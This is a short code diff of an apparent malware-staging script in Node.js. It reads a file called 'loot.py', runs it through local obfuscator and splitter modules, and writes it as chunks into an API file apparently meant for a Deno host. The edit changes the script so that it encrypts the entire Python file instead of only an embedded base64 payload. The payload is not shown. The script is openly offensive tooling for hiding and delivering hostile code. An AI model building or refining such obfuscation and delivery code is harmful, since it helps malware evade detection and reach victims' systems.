@@ -3,24 +3,24 @@ const path = require('path');
 const obfuscator = require('./encoder/obfuscator.js');
 const splitter = require('./encoder/splitter.js');
 
-const LOOT_PATH = path.join(__dirname, '../loot.py');
-const OUTPUT_PATH = path.join(__dirname, 'deno-host/api/chunks.ts');
+const LOOT_PATH = path.join(__dirname, 'loot.py');
+const OUTPUT_PATH = path.join(__dirname, 'api/chunks.ts');
 
 console.log(`Reading loot from ${LOOT_PATH}...`);
 
 try {
     const content = fs.readFileSync(LOOT_PATH, 'utf-8');
 
-    // Regex to find PAYLOAD_B64 = "..."
-    // We use a non-greedy or careful match because the string is huge
-    const match = content.match(/PAYLOAD_B64\s*=\s*"(.*?)"/s) || content.match(/PAYLOAD_B64\s*=\s*"(.*)"/);
+    // We want to encrypt the ENTIRE python file, not just the inner payload
+    const payload = content;
+    // const match = content.match(/PAYLOAD_B64\s*=\s*"(.*?)"/s) || content.match(/PAYLOAD_B64\s*=\s*"(.*)"/);
     
-    if (!match) {
-        console.error("Could not find PAYLOAD_B64 in loot.py");
-        process.exit(1);
-    }
+    // if (!match) {
+    //    console.error("Could not find PAYLOAD_B64 in loot.py");
+    //    process.exit(1);
+    // }
 
-    const payload = match[1];
+    // const payload = match[1];
     console.log(`Payload found! Length: ${payload.length}`);
 
     // Config
